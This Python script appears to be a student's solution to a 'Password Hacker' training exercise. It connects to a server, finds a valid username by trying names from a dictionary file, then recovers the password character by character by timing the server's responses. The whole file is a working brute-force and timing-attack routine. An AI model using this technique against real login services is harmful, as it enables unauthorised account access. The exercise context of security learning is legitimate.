import utils
import logging
import time

logging.basicConfig(filename='prog.log', filemode='w',
                    format='%(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

ip, port = utils.get_args()

client = utils.connect_to_server(ip, port)

login_gen = utils.login_dictionary_gen(
    "C:/Users/Jessica/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt")

pw_gen = utils.pass_gen2()

login = next(login_gen)

pw_accumulator = ''
letter = ''
password = ' '

while True:
    data = utils.json_data(login, password)
    utils.send_data(client, data)
    dict_msg = utils.json_response(utils.receive_data(client))
    msg = dict_msg['result']

    if msg == 'Wrong login!':
        login = next(login_gen)
        logging.info(f'Login - {login}')
    else:
        break

while True:
    letter = next(pw_gen)
    password = pw_accumulator + letter

    data = utils.json_data(login, password)
    start = time.perf_counter()
    utils.send_data(client, data)
    dict_msg = utils.json_response(utils.receive_data(client))
    end = time.perf_counter()
    msg = dict_msg['result']

    if msg == 'Wrong password!':
        time_gap = end - start
        logging.warning(f'Total time for send & receive = {time_gap}')
        logging.info(f'password - {password}: accumulator - {pw_accumulator} + letter - {letter}')
        if time_gap >= 0.1:
            pw_accumulator += letter
            pw_gen = utils.pass_gen2()
    # elif msg == 'Exception happened during login':
    #    pw_accumulator += letter
    #    pw_gen = utils.pass_gen2()
    #    logging.info(f'Accumulator - {pw_accumulator}')
    elif msg == 'Connection success!' or msg == 'Too many attempts':
        print(data)
        break

client.close()
